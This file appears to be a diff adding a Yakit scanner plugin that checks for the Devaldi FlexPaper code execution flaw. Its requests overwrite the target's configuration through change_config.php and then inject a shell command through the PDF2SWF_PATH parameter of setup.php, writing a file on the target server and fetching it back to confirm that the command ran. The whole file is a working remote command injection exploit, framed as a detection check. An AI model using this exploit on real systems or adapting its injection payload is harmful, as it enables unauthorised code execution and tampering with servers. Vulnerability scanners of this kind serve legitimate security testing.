@@ -1,0 +1,106 @@
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    var url
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    level=["","low","middle","high","critical"]
+    if isTls {
+        url="https://"+addr
+    }else{
+        url="http://"+addr
+    }
+    vulnable=false
+
+    reference="Devaldi FlexPaper代码执行漏洞"
+    severity=""
+    type="漏洞"
+    verifyStr = str.RandStr(6)
+    fileName = str.RandStr(6)
+
+    poc_url_r0= url + `/php/change_config.php`
+    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),
+    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
+    http.body(`SAVE_CONFIG=1&PDF_Directory=a&SWF_Directory=config/&LICENSEKEY=a&SPLITMODE=a&RenderingOrder_PRIM=a&RenderingOrder_SEC=a
+`),)
+    breq,_=http.dump(req_r0)
+    resp_r0, err := http.Do(req_r0)
+    die(err)
+    bresp,_=http.dump(resp_r0)
+    header, body = poc.Split(bresp)
+    r0_flag = false
+    if resp_r0.StatusCode == 302 || resp_r0.StatusCode == 200{
+        r0_flag = true
+    }
+
+    poc_url_r1= url + `/php/change_config.php`
+    req_r1, _ := http.NewRequest("POST",poc_url_r1,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),
+    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
+    http.body(`SAVE_CONFIG=1&PDF_Directory=a&SWF_Directory=config/&LICENSEKEY=a&SPLITMODE=a&RenderingOrder_PRIM=a&RenderingOrder_SEC=a
+`),)
+    breq,_=http.dump(req_r1)
+    resp_r1, err := http.Do(req_r1)
+    die(err)
+    bresp,_=http.dump(resp_r1)
+    header, body = poc.Split(bresp)
+    r1_flag = false
+    if resp_r1.StatusCode == 302 || resp_r1.StatusCode == 200{
+        r1_flag = true
+    }
+
+    poc_url_r2= url + `/php/setup.php?step=2&PDF2SWF_PATH=printf%20`+ parseStr(verifyStr) +`%25%25`+ parseStr(verifyStr) +`%20%3e%20`+ parseStr(fileName) +``
+    req_r2, _ := http.NewRequest("GET",poc_url_r2,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r2)
+    resp_r2, err := http.Do(req_r2)
+    die(err)
+    bresp,_=http.dump(resp_r2)
+    header, body = poc.Split(bresp)
+    r2_flag = false
+    if resp_r2.StatusCode == 200{
+        r2_flag = true
+    }
+
+    poc_url_r3= url + `/php/`+ parseStr(fileName) +`pdf2swf`
+    req_r3, _ := http.NewRequest("GET",poc_url_r3,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r3)
+    resp_r3, err := http.Do(req_r3)
+    die(err)
+    bresp,_=http.dump(resp_r3)
+    header, body = poc.Split(bresp)
+    r3_flag = false
+    if resp_r3.StatusCode == 200 && str.Contains(string(body),parseStr(parseStr(verifyStr + "%" + verifyStr))){
+        r3_flag = true
+    }
+
+    poc_url=poc_url_r3
+    if r0_flag && r1_flag && r2_flag && r3_flag{
+        vulnable = true
+    }
+    if vulnable {
+            yakit.Info("FOUND INFO for %v %v",reference,type)
+            risk.NewRisk(
+                url, risk.severity(severity), 
+                risk.title(sprintf("FOUND %v %v",reference,type)),
+                risk.titleVerbose(sprintf("%v %v",reference,type)),
+                risk.type(type), risk.typeVerbose(type),
+                risk.details({
+                    "request": breq,
+                    "response": bresp,
+                    "url": poc_url,
+                }),
+            )
+        }
+    return
+}
+handle = func(result) {
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+}
